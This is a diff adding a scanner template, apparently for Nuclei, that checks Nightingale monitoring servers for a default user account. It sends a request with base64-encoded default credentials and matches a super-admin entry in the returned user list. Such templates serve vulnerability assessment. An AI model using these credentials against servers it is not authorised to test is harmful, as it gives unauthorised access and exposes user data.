@@ -1,0 +1,44 @@
+id: poc-yaml-nightingale-default-user
+
+info:
+  name: Nightingale Monitoring Default User Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: weak-credential,info-leak
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Nightingale"
+
+  - raw:
+      - |
+        GET /v1/n9e/users HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic dXNlcjAwMTpjY2MyNmRhN2I5YWJhNTMzY2JiMjYzYTM2YzA3ZGNjNQ==
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"超管\""
+          - "\"username\":\"superAdmin\""
+      - type: word
+        part: header
+        words:
+          - "application/json"
